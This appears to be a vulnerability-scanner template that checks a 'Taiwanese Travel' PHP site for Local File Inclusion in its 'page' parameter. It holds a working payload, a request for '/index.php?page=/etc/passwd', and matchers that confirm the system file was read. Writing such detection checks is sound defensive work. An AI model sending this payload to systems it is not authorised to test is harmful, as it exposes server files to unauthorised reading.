id: "taiwanese-travel-lfi"
name: "Taiwanese Travel - Local File Inclusion"
severity: "high"
description: "The vulnerability in '/index.php?page=' allows for Local File Inclusion (LFI), granting attackers the ability to include and potentially execute files on the server, compromising the application's security"
tech:
  - "php"
tags:
  - "lfi"
  - "unauth"
  - "taiwanese"
  - "vuln"
reference: "https://www.exploitalert.com/view-details.html?id=35607"
spaExclusion: true
request:
  method: "GET"
  path: "/index.php?page=/etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:x:0:0:"
  - type: "word"
    part: "body"
    words:
      - "travel"
  - type: "status"
    status:
      - 200
